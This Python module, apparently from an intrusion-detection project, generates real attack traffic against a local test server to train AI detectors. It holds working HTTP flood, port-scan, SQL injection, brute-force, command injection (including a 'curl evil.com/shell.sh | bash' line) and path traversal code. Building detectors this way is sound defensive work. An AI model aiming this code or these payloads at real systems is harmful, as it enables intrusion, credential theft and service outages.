"""
Real Attack Simulator for EchoTrace-AutoShield.

Instead of just sampling from class statistics, this module generates
ACTUAL malicious network traffic that gets captured and analyzed by the AI.

Attack Types:
  - DoS: Real HTTP flood (rapid concurrent requests)
  - Probe: Real port scanning
  - R2L: Real SQL injection + brute-force login attempts
  - U2R: Real shell command injection payloads

The captured traffic is then feature-extracted and fed to the AI models.
"""

import requests
import threading
import time
import socket
import random
import string

TARGET_URL = "http://127.0.0.1:8080"


def dos_attack(duration=3, threads=10, target_url=TARGET_URL):
    """
    Real DoS: Flood the target with rapid HTTP requests.
    Sends hundreds of concurrent GET/POST requests to overwhelm the server.
    """
    results = {"requests_sent": 0, "errors": 0, "start": time.time()}
    stop_flag = threading.Event()
    
    def flood():
        while not stop_flag.is_set():
            try:
                # Randomize request type and path
                paths = ["/", "/dashboard", "/auth", "/blocked",
                         f"/static/target_styles.css?r={random.randint(1,99999)}"]
                path = random.choice(paths)
                
                if random.random() < 0.5:
                    # GET flood
                    requests.get(f"{target_url}{path}", timeout=1,
                                headers={"User-Agent": f"DoSBot/{random.randint(1,100)}"})
                else:
                    # POST flood with junk data
                    junk = ''.join(random.choices(string.ascii_letters, k=random.randint(100, 5000)))
                    requests.post(f"{target_url}/auth", timeout=1,
                                 json={"username": junk, "password": junk},
                                 headers={"User-Agent": f"FloodBot/{random.randint(1,100)}"})
                results["requests_sent"] += 1
            except Exception:
                results["errors"] += 1
    
    # Launch flood threads
    flood_threads = []
    for _ in range(threads):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        flood_threads.append(t)
    
    # Run for specified duration
    time.sleep(duration)
    stop_flag.set()
    
    # Wait for threads to finish
    for t in flood_threads:
        t.join(timeout=1)
    
    results["duration"] = time.time() - results["start"]
    results["rps"] = results["requests_sent"] / max(results["duration"], 0.001)
    return results


def probe_attack(target_host="127.0.0.1", port_range=(75, 90), target_url=TARGET_URL):
    """
    Real Probe: Port scanning + HTTP fingerprinting.
    Scans ports and probes HTTP headers to discover services.
    """
    results = {"open_ports": [], "closed_ports": [], "http_headers": {}, "start": time.time()}
    
    # 1. TCP port scan
    for port in range(port_range[0], port_range[1]):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((target_host, port))
            if result == 0:
                results["open_ports"].append(port)
            else:
                results["closed_ports"].append(port)
            sock.close()
        except Exception:
            results["closed_ports"].append(port)
    
    # 2. HTTP fingerprinting (OPTIONS, HEAD, TRACE)
    fingerprint_methods = ["OPTIONS", "HEAD", "TRACE"]
    for method in fingerprint_methods:
        try:
            resp = requests.request(method, target_url, timeout=2)
            results["http_headers"][method] = dict(resp.headers)
        except Exception:
            pass
    
    # 3. Directory enumeration (common paths)
    common_paths = ["/admin", "/api", "/config", "/env", "/.git",
                    "/wp-admin", "/phpmyadmin", "/robots.txt", "/sitemap.xml",
                    "/.env", "/server-status", "/debug", "/test"]
    results["discovered_paths"] = []
    for path in common_paths:
        try:
            resp = requests.get(f"{target_url}{path}", timeout=1,
                              headers={"User-Agent": "Nmap/7.94"})
            if resp.status_code != 404:
                results["discovered_paths"].append({"path": path, "status": resp.status_code})
        except Exception:
            pass
    
    results["duration"] = time.time() - results["start"]
    results["ports_scanned"] = len(results["open_ports"]) + len(results["closed_ports"])
    return results


def r2l_attack(target_url=TARGET_URL):
    """
    Real R2L: SQL injection attempts + brute-force login.
    Sends actual malicious payloads to authentication endpoints.
    """
    results = {"sqli_attempts": 0, "bruteforce_attempts": 0,
               "payloads_sent": [], "start": time.time()}
    
    # 1. SQL Injection payloads
    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' UNION SELECT * FROM users --",
        "1; DROP TABLE users;",
        "' OR 1=1 #",
        "admin'; EXEC xp_cmdshell('whoami') --",
        "' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --",
        "1' ORDER BY 1--+",
        "' UNION SELECT NULL,NULL,NULL --",
    ]
    
    for payload in sqli_payloads:
        try:
            # Try SQL injection in login form
            resp = requests.post(f"{target_url}/auth", timeout=2,
                               json={"username": payload, "password": payload},
                               headers={"User-Agent": "sqlmap/1.7"})
            results["sqli_attempts"] += 1
            results["payloads_sent"].append({"type": "sqli", "payload": payload[:50]})
        except Exception:
            pass
    
    # 2. Brute-force login attempts
    common_usernames = ["admin", "root", "administrator", "user", "test",
                        "guest", "operator", "manager", "demo"]
    common_passwords = ["password", "123456", "admin", "root", "pass",
                        "12345678", "qwerty", "abc123", "letmein", "welcome"]
    
    attempts = min(30, len(common_usernames) * 3)
    for i in range(attempts):
        user = random.choice(common_usernames)
        pwd = random.choice(common_passwords)
        try:
            resp = requests.post(f"{target_url}/auth", timeout=1,
                               json={"username": user, "password": pwd},
                               headers={"User-Agent": "Hydra/9.5"})
            results["bruteforce_attempts"] += 1
            results["payloads_sent"].append({"type": "bruteforce", "user": user})
        except Exception:
            pass
    
    results["duration"] = time.time() - results["start"]
    results["total_attempts"] = results["sqli_attempts"] + results["bruteforce_attempts"]
    return results


def u2r_attack(target_url=TARGET_URL):
    """
    Real U2R: Command injection + privilege escalation payloads.
    Sends OS command injection and path traversal attacks.
    """
    results = {"cmdi_attempts": 0, "traversal_attempts": 0,
               "payloads_sent": [], "start": time.time()}
    
    # 1. OS Command injection payloads
    cmdi_payloads = [
        "; whoami",
        "| cat /etc/passwd",
        "$(id)",
        "`uname -a`",
        "; net user",
        "| dir C:\\",
        "&& type C:\\Windows\\System32\\config\\SAM",
        "; cat /etc/shadow",
        "$(curl http://evil.com/shell.sh | bash)",
        "; powershell -enc BASE64PAYLOAD",
    ]
    
    for payload in cmdi_payloads:
        try:
            # Inject in various parameters
            requests.post(f"{target_url}/auth", timeout=1,
                         json={"username": f"admin{payload}", "password": "test"},
                         headers={"User-Agent": f"Mozilla/5.0{payload}"})
            
            requests.get(f"{target_url}/dashboard?cmd={payload}", timeout=1)
            results["cmdi_attempts"] += 1
            results["payloads_sent"].append({"type": "cmdi", "payload": payload[:40]})
        except Exception:
            pass
    
    # 2. Path traversal attacks
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\config\\SAM",
        "....//....//....//etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]
    
    for payload in traversal_payloads:
        try:
            requests.get(f"{target_url}/{payload}", timeout=1,
                        headers={"User-Agent": "DirBuster/1.0"})
            results["traversal_attempts"] += 1
            results["payloads_sent"].append({"type": "traversal", "payload": payload[:40]})
        except Exception:
            pass
    
    # 3. Header injection (privilege escalation)
    priv_headers = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Original-URL": "/admin",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Forwarded-Host": "localhost",
    }
    try:
        requests.get(f"{target_url}/dashboard", timeout=1, headers=priv_headers)
        results["payloads_sent"].append({"type": "header_injection", "payload": "X-Forwarded-For bypass"})
    except Exception:
        pass
    
    results["duration"] = time.time() - results["start"]
    results["total_attempts"] = results["cmdi_attempts"] + results["traversal_attempts"]
    return results


def run_attack(attack_type, target_url=TARGET_URL):
    """
    Execute a real attack simulation and return metrics.
    These generate actual network traffic that can be captured by the sniffer.
    """
    attack_funcs = {
        "DoS": lambda: dos_attack(duration=2, threads=5, target_url=target_url),
        "Probe": lambda: probe_attack(target_url=target_url),
        "R2L": lambda: r2l_attack(target_url=target_url),
        "U2R": lambda: u2r_attack(target_url=target_url),
    }
    
    func = attack_funcs.get(attack_type)
    if not func:
        return {"error": f"Unknown attack type: {attack_type}"}
    
    return func()
